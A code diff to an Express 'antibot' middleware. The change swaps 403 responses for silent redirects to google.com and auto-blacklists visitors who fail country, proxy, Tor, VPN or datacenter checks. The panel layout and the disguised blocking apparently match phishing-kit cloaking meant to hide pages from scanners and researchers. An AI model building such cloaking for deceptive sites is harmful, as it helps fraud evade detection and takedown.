@@ -4,7 +4,7 @@
 import type { Request, Response, NextFunction } from "express";
 import { getRealIp } from "../secure/panel/ip-manager";
 import { getAntiBotConfig } from "../services/antibot-config-service";
-import { isWhitelisted, isBlacklisted } from "../secure/panel/ip-manager";
+import { isWhitelisted, isBlacklisted, addToBlacklist } from "../secure/panel/ip-manager";
 import { detectProxy } from "../secure/panel/proxy-detection";
 import { isDatacenterIP } from "../secure/panel/datacenter-detection";
 import { logBotActivity } from "../secure/panel/botfuck-logger";
@@ -129,16 +129,13 @@ export async function antibotMiddleware(
       return next();
     }
 
-    // Vérifier si l'IP est blacklistée
+    // Vérifier si l'IP est blacklistée → blacklist + redirection Google
     const isBlacklistedIP = await isBlacklisted(ip);
     if (isBlacklistedIP) {
       await logBotActivity(ip, "IP in blacklist", "blocked", {
         details: { source: "blacklist" },
       });
-      res.status(403).json({
-        error: "Access Denied",
-        message: "Your IP has been blocked",
-      });
+      res.redirect(302, "https://www.google.com");
       return;
     }
 
@@ -151,18 +148,15 @@ export async function antibotMiddleware(
       const isAllowedCountry = countryCode && allowedCountries.includes(countryCode);
       // Rediriger si pays inconnu (geo null, ex: localhost) ou pays non autorisé
       if (!isAllowedCountry) {
-        await logBotActivity(
-          ip,
-          geo ? `Country not allowed: ${geo.countryCode} (${geo.country})` : "Country unknown (geo lookup failed)",
-          "blocked",
-          {
-            details: {
-              source: "geo_filter",
-              countryCode: geo?.countryCode ?? "??",
-              country: geo?.country ?? "Unknown",
-            },
-          }
-        );
+        const reason = geo ? `Country not allowed: ${geo.countryCode} (${geo.country})` : "Country unknown (geo lookup failed)";
+        await logBotActivity(ip, reason, "blocked", {
+          details: {
+            source: "geo_filter",
+            countryCode: geo?.countryCode ?? "??",
+            country: geo?.country ?? "Unknown",
+          },
+        });
+        await addToBlacklist(ip, reason);
         res.redirect(302, "https://www.google.com");
         return;
       }
@@ -318,30 +312,24 @@ export async function antibotMiddleware(
         `[Anti-Bot] Blocked IP: ${ip}, Score: ${blockScore}, Reason: ${blockReason || "Multiple suspicious indicators"}`
       );
 
-      await logBotActivity(
-        ip,
-        blockReason || "Multiple suspicious indicators",
-        "blocked",
-        {
-          details: {
-            score: blockScore,
-            userAgent: req.headers["user-agent"],
-            checks: {
-              userAgent: config.user_agent_check,
-              headers: config.header_check,
-              proxy: config.proxy_check,
-              tor: config.tor_check,
-              vpn: config.vpn_check,
-              datacenter: config.datacenter_check,
-            },
+      const blockReasonFinal = blockReason || "Multiple suspicious indicators";
+      await logBotActivity(ip, blockReasonFinal, "blocked", {
+        details: {
+          score: blockScore,
+          userAgent: req.headers["user-agent"],
+          checks: {
+            userAgent: config.user_agent_check,
+            headers: config.header_check,
+            proxy: config.proxy_check,
+            tor: config.tor_check,
+            vpn: config.vpn_check,
+            datacenter: config.datacenter_check,
           },
-        }
-      );
-
-      res.status(403).json({
-        error: "Access Denied",
-        message: "Suspicious activity detected",
+        },
       });
+      await addToBlacklist(ip, blockReasonFinal);
+
+      res.redirect(302, "https://www.google.com");
       return;
     }
 
